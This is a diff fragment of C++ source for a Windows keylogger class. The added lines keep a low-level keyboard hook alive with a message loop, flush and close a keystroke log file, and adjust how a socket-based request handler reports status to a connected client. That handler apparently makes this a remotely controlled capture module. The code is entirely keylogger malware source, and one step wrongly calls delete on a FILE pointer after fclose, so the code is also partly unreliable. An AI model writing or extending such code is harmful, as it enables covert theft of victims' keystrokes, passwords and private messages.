@@ -41,25 +41,43 @@ DWORD WINAPI Keylogger::SKeylogger(LPVOID *) {
         hKeyboardInstance = nullptr;
         return 1;
     }
+    MSG msg = {};
+    while (isKeyloggerRunning && GetMessage(&msg, nullptr, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+    if (isKeyloggerRunning)
+        StopKeylogger();
     return 0;
 }
 
 void Keylogger::StopKeylogger() {
     if (!isKeyloggerRunning) {
+        std::cerr << "Keylogger is not running." << std::endl;
         return;
     }
     isKeyloggerRunning = false;
     if (keylogFile) {
+        fflush(keylogFile);
         fclose(keylogFile);
         delete keylogFile;
         keylogFile = nullptr;
+    }
+    else {
+        std::cerr << "Keylogger file is already closed." << std::endl;
     }
     if (hKeyboardHook) {
         UnhookWindowsHookEx(hKeyboardHook);
         hKeyboardHook = nullptr;
     }
+    else {
+        std::cerr << "Keylogger hook is already closed." << std::endl;
+    }
     if (hKeyboardInstance) {
         hKeyboardInstance = nullptr;
+    }
+    else {
+        std::cerr << "Keylogger instance is already closed." << std::endl;
     }
 }
 
@@ -463,15 +481,12 @@ void Keylogger::HandleRequest(SOCKET client_socket, const PacketHeader &header) 
             break;
         }
         case 0x03: {
-            Response response(header.request_id, 0x04);
-            std::string message = "Keylogger is " + std::string(isKeyloggerRunning ? "running" : "stopped");
-            response.setMessage(message);
+            Response response(header.request_id, isKeyloggerRunning ? 0x00 : 0x04);
             response.sendResponse(client_socket);
             break;
         }
         default: {
             Response response(header.request_id, 0x05);
-            response.setMessage("Invalid request type");
             response.sendResponse(client_socket);
             break;
         }
